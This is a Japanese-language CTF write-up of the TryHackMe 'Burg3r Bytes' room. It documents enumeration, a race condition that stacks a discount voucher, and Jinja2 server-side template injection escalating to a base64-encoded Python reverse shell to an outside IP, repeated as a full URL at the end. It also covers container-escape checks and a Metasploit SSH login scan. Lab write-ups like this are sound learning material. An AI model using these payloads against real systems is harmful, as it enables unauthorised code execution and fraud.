# TryHack3M: Burg3r Bytes CTF

https://tryhackme.com/room/burg3rbytes

## Enumeration

```shell
TARGET=10.49.148.184
sudo bash -c "echo $TARGET  burg.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug/3.0.2 Python/3.8.10
```

SSH、HTTP。Werkzeug

```sh
root@ip-10-49-90-128:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.49.148.184
+ Target Hostname:    burg.thm
+ Target Port:        80
+ Start Time:         2026-03-26 01:55:59 (GMT0)
---------------------------------------------------------------------------
+ Server: Werkzeug/3.0.2 Python/3.8.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, OPTIONS, GET 
+ OSVDB-3092: /console: This might be interesting...
+ 1707 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2026-03-26 01:56:03 (GMT0) (4 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

/console がある。PINコード入力画面が表示される。

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.49.148.184/ ----
+ http://10.49.148.184/basket (CODE:200|SIZE:6081)                                                                      
+ http://10.49.148.184/checkout (CODE:200|SIZE:3095)                                                                    
+ http://10.49.148.184/console (CODE:200|SIZE:1563)                                                                     
+ http://10.49.148.184/login (CODE:200|SIZE:7724)                                                                       
+ http://10.49.148.184/register (CODE:200|SIZE:7773)
```

## Web

ルーム説明に下記のように書かれていることから、£3,000,000 のバーガーかピザを購入するのが目的と思われる。

```
Your goal? Exploit this system to score the ultimate haul: 3 million burgers or pizzas.
```

### /register

POST に対して `405 METHOD NOT ALLOWED` が返る不思議な状況。

### /login

registerと同様、POSTに対して405が返る。

### /add-to-bascket

`GET /add-to-basket?itemid=TRYHACK3M-foo HTTP/1.1` のように、存在しない商品をカートに追加しようとすると、`<a href="/?err=NXITEM">` が返る。  
また、成功したときは `/?err=SUCCESS`、すでに同じ商品が入っている場合は `/?err=INBASKET` が返る。  
err パラメータが何かに使われているかは不明。

err以外のパラメータをファジングしてみたが、何も出なかった。

```sh
root@ip-10-48-94-120:~# ffuf -u 'http://burg.thm/?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 12758
```

errの値もファジングしたが何も出なかった。

```sh
root@ip-10-48-94-120:~# cat /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt | tr '[:lower:]' '[:upper:]' > upper_common.txt
root@ip-10-48-94-120:~# ffuf -u 'http://burg.thm/?err=FUZZ' -c -w upper_common.txt -fs 12703
```

### /checkout

バスケット画面から遷移。  
無効なバウチャーコードを入れると、`Invalid or Expired Voucher.` 表示。

SQLiは無い。

### セッション

Cookieを消してセッションを紐づける情報が何も無いにもかかわらず、バスケットの内容が維持されている。かなり特異な状況。  
AttackBox でブラウザ表示しても同じ表示になっているため、全ユーザーでバスケットの内容を共有している。しかし、それが何かに使えるかは不明。

```http
GET /basket HTTP/1.1
Host: burg.thm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://burg.thm/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8
Connection: keep-alive
```

checkout画面に遷移したタイミングで、セッションCookieがセットされる。

```http
Set-Cookie: session=eyJjc3JmX3Rva2VuIjoiNmE5MjM0ZmI0M2U1OGI2OWM0NzA3ZTQ0ZjA5MzI0NzQxZWM2NTc2YyJ9.acSfTA.Sc5fhLDhcTk90WS0PzQKLj_3uJk; HttpOnly; Path=/
```

セッションCookieの中には、CSRFトークンが入っている。

```json
{"csrf_token":"6a9234fb43e58b69c4707e44f09324741ec6576c"}
```

また、checkout画面のPOSTでは、パラメータとしてもCSRFトークンが渡されている。

```http
Cookie: session=eyJjc3JmX3Rva2VuIjoiNmE5MjM0ZmI0M2U1OGI2OWM0NzA3ZTQ0ZjA5MzI0NzQxZWM2NTc2YyJ9.acSfTA.Sc5fhLDhcTk90WS0PzQKLj_3uJk

csrf_token=IjZhOTIzNGZiNDNlNThiNjljNDcwN2U0NGYwOTMyNDc0MWVjNjU3NmMi.acSfTA.c-PrHxRzal5sdV1uRbfN1kD9V4U&name=thm&voucher_code=12345&submit=Checkout
```

```
"6a9234fb43e58b69c4707e44f09324741ec6576c"
```

GET -> POST -> GET -> POST ... という形のブルートフォースは可能だが、バウチャーコードにはアルファベットや特殊文字が入る可能性が高く無理筋と思われる。

## 状況整理

詰まったので状況整理のため気になっている点を列挙。

- トップ画面の err パラメータ
- POSTが無効化された login, register
- バスケットが全ユーザーで共有されている
- CSRFトークンの実装
- 課題背景の下記説明

```
今回の新リリースでは、初回登録特典として、全注文に使える10ポンドのクーポンを提供しています。さらに、300万人目の顧客向けには、全商品無料キャンペーンも実施中！
```

バウチャーコードを使わずに注文するフローは無いのかと不思議だったが、バウチャーコードを空欄にして名前だけ入れてPOSTすると、`No money, honey...` と表示されることにここで初めて気が付いた。

名前に対応するBalanceが管理されている？ login, register 画面は名前ではなくEメールアドレスになっているが、checkout画面の名前もEメールアドレスなのかは不明。

トップ画面のレビューに3人の名前が出ている。1000ポンドの注文で試してみたが、3人とも No money だった。

```
cmnatic
melmols
munra
```

もしBalanceが全ユーザーの共通データになっているとしたら、10ポンドバウチャーを異なるユーザーで100回登録したら1000ポンドの購入ができるようになる？？  
またよく考えたら、ログインしていない状態で9.99ポンドと表示されているのは、Balanceも全ユーザーで共有されていることを示唆しているのではないか？  
いずれにしても有効なバウチャーコードが欲しい。

4桁数字をブルートフォースするコードを作成して試してみたが、ヒットしなかった。

```sh
root@ip-10-144-109-200:~# python3 ./csrf_brute.py
```

手あたり次第に試し、`TRYHACK3M` が有効だった。50％OFFクーポン。  
また、/clear-vouchers のリンクが出てきた。

```
Applied Vouchers
['TRYHACK3M']
Total discount: 50.0%
```

異なるユーザー名で使っても、TotalDiscountは50%のまま。  
もし内部的に掛け算になっているとしたら8回かければ9.99ポンドで足りるはずだが、同じユーザー、異なるユーザーで10回送ってみても No money のままだった。  

Burpで同じリクエストを並列で送ったら、購入成功した。

```html
<p>You should be redirected automatically to the target URL: <a href="/receipt/82739098304716027352341076?name=thm">/receipt/82739098304716027352341076?name=thm</a>
```

大した情報が無いのは、1000ポンドのアイテムだからなのか不明。

```
Congratulations on Your Purchase!
Dear thm,

Thank you for purchasing the 3M item! As a token of our appreciation, please find below your special certificate:

TryHack3M
This certifies that thm is now the proud owner of the 3M item.

We hope you enjoy your treat.
```

名前が画面に表示されているので、SSTIを試す。名前を `{{7*'7'}}` として競合を発生させたら、証明書部分に `7777777` と表示された。

```
ngratulations on Your Purchase!

Dear {{7*'7'}},

Thank you for purchasing the 3M item! As a token of our appreciation, please find below your special certificate:
TryHack3M

This certifies that 7777777 is now the proud owner of the 3M item.

We hope you enjoy your treat.
```

## SSTI

ls -al

```json
{{request.application.__globals__.__builtins__.__import__('os').popen('echo bHMgLWFsIHwgYmFzZTY0|base64 -d|bash').read()}}
```

flag.txt を発見。

```sh
total 84
drwxr-xr-x 1 root root 4096 Apr 12  2024 .
drwxr-xr-x 1 root root 4096 Apr 12  2024 ..
-rw-rw-r-- 1 root root 6148 Apr  2  2024 .DS_Store
-rw-rw-r-- 1 root root  389 Apr 12  2024 Dockerfile
-rw-rw-r-- 1 root root   44 Apr  5  2024 README.md
drwxrwxr-x 2 root root 4096 Apr 12  2024 __pycache__
-rw-rw-r-- 1 root root 5205 Apr 10  2024 app.py
drwxrwxr-x 1 root root 4096 Apr 12  2024 cron
-rw-r--r-- 1 root root   24 Apr 12  2024 flag.txt
drwxrwxr-x 1 root root 4096 Apr 12  2024 instance
-rw-rw-r-- 1 root root   60 Apr  2  2024 launch.sh
-rw-rw-r-- 1 root root   53 Apr 10  2024 requirements.txt
drwxrwxr-x 6 root root 4096 Apr 12  2024 static
drwxrwxr-x 2 root root 4096 Apr 12  2024 templates
drwxrwxr-x 4 root root 4096 Apr 12  2024 venv
-rw-rw-r-- 1 root root   59 Apr  2  2024 wsgi.py
```

リバースシェル

```json
{{request.application.__globals__.__builtins__.__import__('os').popen('echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMTI4LjEwNiIsODg4OCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIikn |base64 -d|bash').read()}}
```

```sh
$ nc -nlvp 8888    
listening on [any] 8888 ...
connect to [192.168.128.106] from (UNKNOWN) [10.145.148.48] 50880
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## Dockerエスケープ

ホストユーザーのSSH認証でも入っていないかと site.db を開いたが、バウチャーコードが入っていただけだった。

ゲストOS側からできるエスケープを一通り調べたが、可能性があるとすればカーネルモジュールだけだと思われる。

```sh
root@7b05c5df3d55:/app/instance# cat /proc/sys/kernel/modules_disabled
cat /proc/sys/kernel/modules_disabled
0
root@7b05c5df3d55:/app/instance# which make
which make
/usr/bin/make
```

肝心の capability を調べたいが、capsh が入っていない。

```sh
root@7b05c5df3d55:/app/instance# capsh --print
capsh --print
bash: capsh: command not found
```

代替手段

```sh
root@7b05c5df3d55:/app/instance# cat /proc/self/status | grep Cap
cat /proc/self/status | grep CapEff
CapEff: 00000000a80425fb
```

自分のマシンで

```sh
$ capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

CAP_SYS_MODULE は入っていなかった。

Dockerfile

```sh
root@7b05c5df3d55:/app# cat Dockerfile
cat Dockerfile
FROM ubuntu:20.04

RUN apt-get update -y && \
    apt-get install -y python3 python3-pip python3-dev cron vim


COPY ./requirements.txt /app/requirements.txt


WORKDIR /app

RUN echo "THM{[REDACTED]}" >> /app/flag.txt


RUN pip install -r requirements.txt

COPY . /app

RUN chmod 644 /app/cron/client_py.py
RUN crontab /app/cron/crontab

ENTRYPOINT [ "python3" ]

CMD [ "app.py" ]
```



## 振り返り

-
- capsh が無い場合の代替手段を学べて良かった。

## Tags

#tags: #tags: #tags:

```sh
# 大分類（Linuxはタグ付けしない）
Window Kerberos AWS pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM

# 脆弱性の種類
CVE-xxxx-yyyyy カーネルエクスプロイト
ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報 証明書テンプレート

# 攻撃の種類
サービス LFI SSRF XSS SQLインジェクション 競合 認証バイパス フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD セッションID AVバイパス UACバイパス AMSIバイパス PaddingOracles

# ツールなど
docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle スマートコントラクト
```

## メモ

### シェル安定化

```shell
# python が無くても、python3 でいける場合もある
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236
```

### SSH

ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする

```sh
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
```

エラー

```sh
# no matching host key type found. Their offer: ssh-rsa,ssh-dss
# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
-oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
```

```
http://burg.thm/receipt/82739098304716027352341076?name={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27echo%20cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMTI4LjEwNiIsODg4OCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIikn%20|base64%20-d|bash%27).read()}}
```
